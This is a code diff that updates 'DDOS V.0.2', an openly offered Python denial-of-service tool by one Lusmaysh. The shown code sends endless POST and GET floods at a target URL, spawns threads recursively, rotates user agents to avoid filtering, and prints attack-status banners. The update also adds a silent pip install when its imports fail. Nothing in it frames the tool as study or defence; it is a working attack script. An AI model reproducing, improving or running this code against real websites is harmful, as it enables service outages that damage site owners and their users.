@@ -1,17 +1,20 @@
-# Last Update: 12-09-2021, Author: Lusmaysh
-import sys,os
+# Last Update: 18-09-2021, Author: Lusmaysh
+import sys,os,random
 R = "\33[31;1m";G = "\33[32;1m";Y = "\33[33;1m";
 try:
 	from requests import *
 	from threading import Thread
-	from fake_useragent import UserAgent
-except:
-	sys.exit(f"{Y}[{R}!{Y}] {G}You Haven't Install The Package\n{Y}[{R}!{Y}] {G}Type: pip install -r .req.txt")
+	from user_agent import generate_user_agent
+except ImportError:
+	try:
+		os.system("pip3 install requests threaded user_agent")
+	except:
+		os.system("pip install requests threaded user_agent")
 
 def main():
 	os.system("cls" if os.name=="nt" else "clear")
-	print(f"""{Y}■□■□■ {G}DDOS V.0.1 | By Lusmaysh {Y}■□■□■{G}\n
-▓█████▄ ▓█████▄  ▒█████    ██████    {R}V.0.1{G}
+	print(f"""{Y}■□■□■ {G}DDOS V.0.2 | By Lusmaysh {Y}■□■□■{G}\n
+▓█████▄ ▓█████▄  ▒█████    ██████    {R}V.0.2{G}
 ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒
 ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄
 ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
@@ -50,45 +53,38 @@ def main():
 
 {G}root{R}@{G}ddos (Start DDoS) {Y}≽ {R}""")
 	def ddos_mode1():
-		try:
-			ua = UserAgent().random
-			while True:
-				try:
-					headers = {'User_Agent': ua}
-					ddos = post(url=url, headers=headers)
-					ddos2 = get(url=url, headers=headers)
-					for x in range(loop):
-						thread = Thread(target=ddos_mode1, daemon=True)
-						thread.start()
-						url_check_status = get(url=url, headers=headers)
-						if url_check_status.status_code == 200:
-							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
-						else:
-							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
-				except:
-					continue
-		except exceptions.ConnectionError:
-			sys.exit(f"{Y}[{R}✠{Y}] {R}Please Check Your Internet!")
+		ua = generate_user_agent()
+		while True:
+			try:
+				headers = {'User-Agent': ua}
+				ddos = post(url=url, headers=headers)
+				ddos2 = get(url=url, headers=headers)
+				for x in range(loop):
+					thread = Thread(target=ddos_mode1, daemon=True)
+					thread.start()
+					url_check_status = get(url=url, headers=headers)
+					if url_check_status.status_code == 200:
+						print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
+					else:
+						print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {R}{url_check_status}")
+			except:
+				continue
 	def ddos_mode2():
-		try:
-			while True:
-				try:
-					ua = UserAgent().random
-					headers = {'User_Agent': ua}
-					ddos = post(url=url, headers=headers)
-					ddos2 = get(url=url, headers=headers)
-					for x in range(loop):
-						thread = Thread(target=ddos_mode1, daemon=True)
-						thread.start()
-						url_check_status = get(url=url, headers=headers)
-						if url_check_status.status_code == 200:
-							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
-						else:
-							print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
-				except:
-					continue
-		except exceptions.ConnectionError:
-			sys.exit(f"{Y}[{R}✠{Y}] {R}Please Check Your Internet!")
+		while True:
+			try:
+				headers = {'User-Agent': generate_user_agent()}
+				ddos = post(url=url, headers=headers)
+				ddos2 = get(url=url, headers=headers)
+				for x in range(loop):
+					thread = Thread(target=ddos_mode2, daemon=True)
+					thread.start()
+					url_check_status = get(url=url, headers=headers)
+					if url_check_status.status_code == 200:
+						print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {url_check_status}")
+					else:
+						print(f"{Y}[{R}✠{Y}] {G}DDoS Attack Is Running! URL Status Code: {R}{url_check_status}")
+			except:
+				continue
 	if start=="y" or start=="Y" or start=="yes" or start=="Yes" or start=="YES":
 		if option == "1":
 			ddos_mode1()
